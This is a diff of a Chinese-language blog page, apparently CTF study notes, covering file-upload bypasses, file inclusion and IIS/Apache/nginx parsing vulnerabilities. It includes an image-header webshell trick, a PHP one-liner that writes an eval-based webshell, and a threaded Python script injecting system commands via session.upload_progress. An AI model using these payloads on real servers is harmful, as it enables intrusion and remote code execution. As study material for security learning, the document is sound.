+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.jpg	FF D8 FF E0 00 10 4A 46 49 46</span><br><span class="line">.gif	47 49 46 38 39 61</span><br><span class="line">.png	89 50 4E 47</span><br></pre></td></tr></table></figure>
+
+<p>在文件幻数后面加上自己的WebShell代码就行（常见的是<code>GIF89a</code>）</p>
+<p>图像文件相关信息检测常用的是<code>getimagesize()</code>函数，需要把文件头部分伪造，也就是在幻数的基础上还加了一些文件信息。</p>
+<p><img src="C:/Users/13611/Desktop/nep冬令营/讲课/深入一些吧.assets/image-20210208225003833.png" alt="image-20210208225003833"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">(...some binary data for image...)</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure>
+
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="竞争条件攻击"><a href="#竞争条件攻击" class="headerlink" title="竞争条件攻击"></a>竞争条件攻击</h3><p><code>如upload-labs第十七关</code></p>
+<p>一些网站允许上传任意文件，然后检测文件是否包含Webshell，如果有则删除该文件。</p>
+<blockquote>
+<p>服务器端在处理不同用户的请求时是并发进行的</p>
+<p>如果并发处理不当或相关操作逻辑顺序设计的不合理时，将导致条件竞争漏洞</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>]))&#123;</span><br><span class="line">		copy(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;dst&#x27;</span>]);</span><br><span class="line">      sleep(<span class="number">2</span>);<span class="comment">//检查操作</span></span><br><span class="line">		unlink(<span class="variable">$_GET</span>[<span class="string">&#x27;dst&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>它先把文件保存在本地，再检查，然后删除</p>
+<p>在上传完成和安全检查删除它的间隙，攻击者用多线程不断的发起访问请求该文件</p>
+<p>该文件就会被执行从而生成一个恶意shell</p>
+<p><strong>竞争删除前生成shell流程：</strong></p>
+<blockquote>
+<p>上传文件→访问执行文件，生成shell文件→删除不安全文件     (多线程访问)</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[123]) ?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title=".user.ini绕过"></a>.user.ini绕过</h3><p>在php执行的过程中，除了主 <code>php.ini</code> 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。 <code>.user.ini</code> 中可以定义除了PHP_INI_SYSTEM以外的模式的选项，故可以使用 <code>.user.ini</code> 加上非php后缀的文件构造一个shell，比如 <code>auto_prepend_file=01.gif</code> </p>
+<ul>
+<li>需要当前上传的目录下有php文件</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sijidou/p/13121301.html">.user.ini导致文件上传绕过</a></p>
+<h3 id="解析漏洞攻击"><a href="#解析漏洞攻击" class="headerlink" title="解析漏洞攻击"></a>解析漏洞攻击</h3><p>主要有目录解析、文件解析，Apache解析漏洞、Nginx解析漏洞、IIS7.5解析漏洞。</p>
+<h2 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="zip-amp-bzip2-amp-zlib"><a href="#zip-amp-bzip2-amp-zlib" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib://"></a><strong>zip:// &amp; bzip2:// &amp; zlib://</strong></h3><p><strong>作用：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zip:<span class="comment">// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件</span></span><br><span class="line"></span><br><span class="line">更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等</span><br></pre></td></tr></table></figure>
+
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phar:&#x2F;&#x2F;协议与zip:&#x2F;&#x2F;类似，同样可以访问zip格式压缩包内容</span><br><span class="line">#经常使用于序列化</span><br></pre></td></tr></table></figure>
+
+<h2 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/202819.html">利用session.upload_progress进行文件包含</a></p>
+<p><a target="_blank" rel="noopener" href="https://ctf.show/">CTFSHOW</a></p>
+<p><code>sess_flag</code></p>
+<p><img src="C:/Users/13611/Desktop/nep冬令营/讲课/深入一些吧.assets/4.png" alt="4"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessID = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;url&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">256</span> * <span class="number">1</span>) <span class="comment">#建议正常这个填充数据大一点</span></span><br><span class="line">        response = session.post(</span><br><span class="line">            url,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessID&#125;,</span><br><span class="line">            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;cat ../f*&quot;);?&gt;&#x27;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(url+<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">write = threading.Thread(target=write, args=(session,))</span><br><span class="line">write.daemon = <span class="literal">True</span> <span class="comment">#当daemon为True时，父线程在运行完毕后，子线程无论是否正在运行，都会伴随主线程一起退出。</span></span><br><span class="line">write.start()</span><br><span class="line">read()</span><br></pre></td></tr></table></figure>
+
+<h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p>
+<p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p>
+<p>那么在长度有限的时候，<code>././././</code> (n个) 的形式就可以通过这个把路径爆掉</p>
+<p>在php代码包含中，这种绕过方式要求php版本 &lt; php 5.2.8</p>
+<h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><h2 id="一-IIS5-x-6-x解析漏洞"><a href="#一-IIS5-x-6-x解析漏洞" class="headerlink" title="(一)IIS5.x-6.x解析漏洞"></a>(一)IIS5.x-6.x解析漏洞</h2><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp;该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
+<p>目录解析(6.0)<br>形式：<a target="_blank" rel="noopener" href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a><br>原理: 服务器默认会把.asp，.asp目录下的文件都解析成asp文件。（传个图片马）</p>
+<p>文件解析<br>形式：<a target="_blank" rel="noopener" href="http://www.xxx.com/xx.asp;.jpg%EF%BC%88%E6%96%87%E4%BB%B6%E5%90%8D%EF%BC%89">www.xxx.com/xx.asp;.jpg（文件名）</a><br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。<br>解析文件类型</p>
+<p>IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>/test.asa<br>/test.cer<br>/test.cdx</p>
+<h4 id="Iis7-5解析漏洞-php-ini开启fix-pathinfo"><a href="#Iis7-5解析漏洞-php-ini开启fix-pathinfo" class="headerlink" title="Iis7.5解析漏洞(php.ini开启fix_pathinfo)"></a>Iis7.5解析漏洞(php.ini开启fix_pathinfo)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.php --&gt; &#x2F;xx.jpg         &#x2F;&#x2F;上传.jpg一句话，访问时后面加上&#x2F;xx.php </span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="二-apache解析漏洞"><a href="#二-apache解析漏洞" class="headerlink" title="(二)apache解析漏洞"></a>(二)apache解析漏洞</h2><p>PHP 5.2 00存在截断上传（0x00）(%00)<br>PHP 5.3之后就没有了该漏洞</p>
+<p>漏洞原理<br>Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如test.php.qwe.asd “.qwe”和”.asd” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.qwe.asd解析成php。</p>
+<p>漏洞形式<br><a target="_blank" rel="noopener" href="http://www.xxxx.xxx.com/test.php.php123">www.xxxx.xxx.com/test.php.php123</a><br>其余配置问题导致漏洞</p>
+<p>(1)如果在 Apache 的 conf 里有这样一行配置 </p>
+<p>AddHandler php5-script .php</p>
+<p> 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>(2)如果在 Apache 的 conf 里有这样一行配置 </p>
+<p>AddType application/x-httpd-php .jpg </p>
+<p>即使扩展名是 jpg，一样能以php 方式执行。（htaccess文件上传解析漏洞，可以将这段代码写到.htaccess中，再上传写有php一句话代码的jpg文件中）</p>
+<h2 id="三-nginx解析漏洞"><a href="#三-nginx解析漏洞" class="headerlink" title="(三)nginx解析漏洞"></a>(三)nginx解析漏洞</h2><p>漏洞原理<br>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问<a target="_blank" rel="noopener" href="http://www.xx.com/phpinfo.jpg/1.php%E8%BF%99%E4%B8%AAURL%E6%97%B6%EF%BC%8C$fastcgi_script_name%E4%BC%9A%E8%A2%AB%E8%AE%BE%E7%BD%AE%E4%B8%BA">www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为</a> “phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：<br>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
+<p>漏洞形式<br><a target="_blank" rel="noopener" href="http://www.xxxx.com/UploadFiles/image/1.jpg/1.php">www.xxxx.com/UploadFiles/image/1.jpg/1.php</a><br><a target="_blank" rel="noopener" href="http://www.xxxx.com/UploadFiles/image/1.jpg%00.php">www.xxxx.com/UploadFiles/image/1.jpg%00.php</a><br><a target="_blank" rel="noopener" href="http://www.xxxx.com/UploadFiles/image/1.jpg/%20/0.php">www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</a></p>
+<p>另外一种手法：上传一个名字为test.jpg，然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p>
+<p>nginx解析漏洞(php.ini开启fix_pathinfo)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.php --&gt; xxx.jpg%00.php      &#x2F;&#x2F;Nginx &lt;8.03 空字节代码执行漏洞</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="四-IIS7-5解析漏洞"><a href="#四-IIS7-5解析漏洞" class="headerlink" title="(四)IIS7.5解析漏洞"></a>(四)IIS7.5解析漏洞</h2><p>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。</p>
 
     </div>
 
@@ -318,7 +542,10 @@
     <a href="/2021/04/24/upload-labs%E5%AD%A6%E4%B9%A0%E4%B8%8B%E7%AF%87/" rel="prev" title="upload-labs学习下篇">
       <i class="fa fa-chevron-left"></i> upload-labs学习下篇
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2021/04/29/SQL%E5%85%A5%E9%97%A8%E7%AF%87/" rel="next" title="SQL入门篇">
+      SQL入门篇 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -377,7 +604,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93"><span class="nav-number">1.</span> <span class="nav-text">文件上传姿势总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF"><span class="nav-number">1.1.</span> <span class="nav-text">二次渲染的三种姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GIF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="nav-number">1.1.1.</span> <span class="nav-text">GIF绕过姿势</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PNG%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="nav-number">1.1.2.</span> <span class="nav-text">PNG绕过姿势</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JPG%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="nav-number">1.1.3.</span> <span class="nav-text">JPG绕过姿势</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93"><span class="nav-number">1.</span> <span class="nav-text">文件上传姿势总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.1.</span> <span class="nav-text">文件上传漏洞介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-jsp-asp%E5%B0%8F%E9%A9%AC"><span class="nav-number">1.2.</span> <span class="nav-text">php jsp asp小马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8F%9C%E5%88%80%E8%9A%81%E5%89%91%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.3.</span> <span class="nav-text">菜刀蚁剑介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%EF%BC%9F"><span class="nav-number">1.4.</span> <span class="nav-text">文件上传如何利用？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="nav-number">1.5.</span> <span class="nav-text">文件上传绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A0%A1%E9%AA%8C"><span class="nav-number">1.5.0.1.</span> <span class="nav-text">客户端校验</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A0%A1%E9%AA%8C"><span class="nav-number">1.5.0.2.</span> <span class="nav-text">服务端校验</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">1.5.0.3.</span> <span class="nav-text">绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#htaccess%E7%BB%95%E8%BF%87"><span class="nav-number">1.5.1.</span> <span class="nav-text">.htaccess绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B"><span class="nav-number">1.5.2.</span> <span class="nav-text">内容检测</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FUZZ%E5%AD%97%E5%85%B8"><span class="nav-number">1.6.</span> <span class="nav-text">FUZZ字典</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF"><span class="nav-number">1.7.</span> <span class="nav-text">二次渲染的三种姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GIF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="nav-number">1.7.1.</span> <span class="nav-text">GIF绕过姿势</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PNG%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="nav-number">1.7.2.</span> <span class="nav-text">PNG绕过姿势</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JPG%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="nav-number">1.7.3.</span> <span class="nav-text">JPG绕过姿势</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1"><span class="nav-number">1.8.</span> <span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#demo%E5%AE%9E%E9%AA%8C"><span class="nav-number">2.0.1.</span> <span class="nav-text">demo实验</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI"><span class="nav-number">2.1.</span> <span class="nav-text">本地文件包含(LFI)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.1.0.1.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C"><span class="nav-number">2.1.0.2.</span> <span class="nav-text">实验</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%85%A7%E7%89%87%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C"><span class="nav-number">2.1.0.3.</span> <span class="nav-text">照片木马的制作</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP%E4%B8%AD%E7%9A%84%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.2.</span> <span class="nav-text">PHP中的封装协议(伪协议)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#file"><span class="nav-number">2.2.0.1.</span> <span class="nav-text">file:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php"><span class="nav-number">2.2.0.2.</span> <span class="nav-text">php:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#data"><span class="nav-number">2.2.0.3.</span> <span class="nav-text">data:&#x2F;&#x2F;</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-RFL"><span class="nav-number">2.3.</span> <span class="nav-text">远程文件包含(RFL)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="nav-number">2.3.0.1.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C-1"><span class="nav-number">2.3.0.2.</span> <span class="nav-text">实验</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="nav-number">2.4.</span> <span class="nav-text">绕过姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#url%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">2.4.0.1.</span> <span class="nav-text">url编码绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#00%E6%88%AA%E6%96%AD"><span class="nav-number">2.4.0.2.</span> <span class="nav-text">%00截断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell"><span class="nav-number">2.4.0.3.</span> <span class="nav-text">文件包含getshell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1-1"><span class="nav-number">2.5.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">2.6.</span> <span class="nav-text">总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%B9%BB%E6%95%B0%E6%A3%80%E6%B5%8B%EF%BC%88%E6%96%87%E4%BB%B6%E5%BC%80%E5%A4%B4%EF%BC%89"><span class="nav-number">2.6.1.</span> <span class="nav-text">文件幻数检测（文件开头）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">2.6.2.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="nav-number">2.6.3.</span> <span class="nav-text">竞争条件攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#user-ini%E7%BB%95%E8%BF%87"><span class="nav-number">2.6.4.</span> <span class="nav-text">.user.ini绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB"><span class="nav-number">2.6.5.</span> <span class="nav-text">解析漏洞攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-1"><span class="nav-number">2.7.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#zip-amp-bzip2-amp-zlib"><span class="nav-number">2.7.1.</span> <span class="nav-text">zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar"><span class="nav-number">2.7.2.</span> <span class="nav-text">phar:&#x2F;&#x2F;</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#session-upload-progress"><span class="nav-number">2.8.</span> <span class="nav-text">session.upload_progress</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD"><span class="nav-number">2.8.1.</span> <span class="nav-text">长度截断</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.</span> <span class="nav-text">解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80-IIS5-x-6-x%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.1.</span> <span class="nav-text">(一)IIS5.x-6.x解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Iis7-5%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-php-ini%E5%BC%80%E5%90%AFfix-pathinfo"><span class="nav-number">3.1.0.1.</span> <span class="nav-text">Iis7.5解析漏洞(php.ini开启fix_pathinfo)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C-apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.2.</span> <span class="nav-text">(二)apache解析漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89-nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.3.</span> <span class="nav-text">(三)nginx解析漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B-IIS7-5%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.4.</span> <span class="nav-text">(四)IIS7.5解析漏洞</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -393,7 +620,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -406,7 +633,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -443,13 +670,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">62k</span>
+    <span title="站点总字数">73k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">56 分钟</span>
+    <span title="站点阅读时长">1:07</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
